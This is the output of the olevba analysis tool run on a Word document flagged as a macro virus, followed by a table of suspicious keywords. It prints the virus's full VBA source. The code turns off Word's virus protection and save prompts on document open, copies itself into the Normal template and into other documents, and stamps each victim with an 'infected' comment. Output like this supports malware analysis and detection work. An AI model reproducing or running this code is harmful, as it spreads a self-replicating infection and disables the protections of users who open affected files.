olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-6387937387d690738dc5513da3473e660c75b1fe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-6387937387d690738dc5513da3473e660c75b1fe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next

Options.ConfirmConversions = 0

Application.EnableCancelKey = 0

Options.SaveNormalPrompt = 0

VE29 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

BU18 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.VirusProtection = 0

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set HA65 = ActiveDocument.VBProject.VBComponents.Item(1)

MC3 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set HA65 = NormalTemplate.VBProject.VBComponents.Item(1)

ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "' ****** " & Application.UserName & " was infected " & Now & vbCr

BU18 = BU18 + 2

KI23 = True

End If

If KI23 <> True And MC3 <> True Then GoTo LA42

If KI23 = True Then HA65.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, BU18 - 1))

If MC3 = True Then HA65.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VE29 - 1))

With HA65.CodeModule

For x = 2 To (HA65.CodeModule.CountOfLines - 1) Step 2

.replaceline x, "'" & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinterApplication.UserName & Application.ActiveDocument & Application.ActivePrinter

Next x

End With

LA42:

If VE29 <> 0 And BU18 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

